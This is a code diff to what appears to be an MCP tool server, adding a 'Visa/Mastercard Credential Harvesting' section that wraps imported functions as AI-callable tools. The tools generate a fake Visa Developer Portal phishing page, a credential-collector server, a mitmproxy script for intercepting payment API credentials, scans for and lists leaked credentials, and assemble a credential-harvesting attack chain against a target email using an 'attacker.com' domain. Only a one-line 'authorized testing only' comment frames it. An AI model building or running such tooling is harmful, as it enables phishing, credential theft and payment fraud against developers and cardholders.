@@ -426,5 +426,48 @@ def bionic_swarm_assess(targets: list = None, allowed_ports: list = None) -> str
     return json.dumps(swarm_run_assessment(targets, allowed_ports), indent=2)
 
 
+# ── 10. Visa/Mastercard Credential Harvesting ───────────────────────────────
+# FOR AUTHORIZED SECURITY TESTING ONLY
+
+from visa_mc_mcp_tools import (
+    generate_visa_phish_page,
+    generate_cred_collector,
+    generate_mitm_script,
+    scan_github_for_credentials,
+    get_known_leaked_credentials,
+    credential_harvest_attack_chain,
+)
+
+@app.tool()
+def bionic_visa_phish_page(attacker_url: str = "https://localhost:8080/collect", output_path: str = "visa_login.html") -> str:
+    """Generate a fake Visa Developer Portal login page for authorized phishing tests."""
+    return generate_visa_phish_page(attacker_url, output_path)
+
+@app.tool()
+def bionic_visa_cred_collector(port: int = 8080, output_file: str = "captured_credentials.jsonl") -> str:
+    """Generate a credential collector HTTP server for phishing tests."""
+    return generate_cred_collector(port, output_file)
+
+@app.tool()
+def bionic_visa_mitm_script() -> str:
+    """Generate a mitmproxy script that intercepts Visa/Mastercard API credentials."""
+    return generate_mitm_script()
+
+@app.tool()
+def bionic_visa_github_scan() -> str:
+    """Scan GitHub for leaked Visa/Mastercard API credentials."""
+    return scan_github_for_credentials()
+
+@app.tool()
+def bionic_visa_known_leaks() -> str:
+    """Return database of known leaked Visa/Mastercard credentials from public sources."""
+    return get_known_leaked_credentials()
+
+@app.tool()
+def bionic_visa_attack_chain(target_email: str, attacker_domain: str = "attacker.com") -> str:
+    """Build a complete credential harvesting attack chain for a Visa/Mastercard target."""
+    return credential_harvest_attack_chain(target_email, attacker_domain)
+
+
 if __name__ == "__main__":
     app.run()
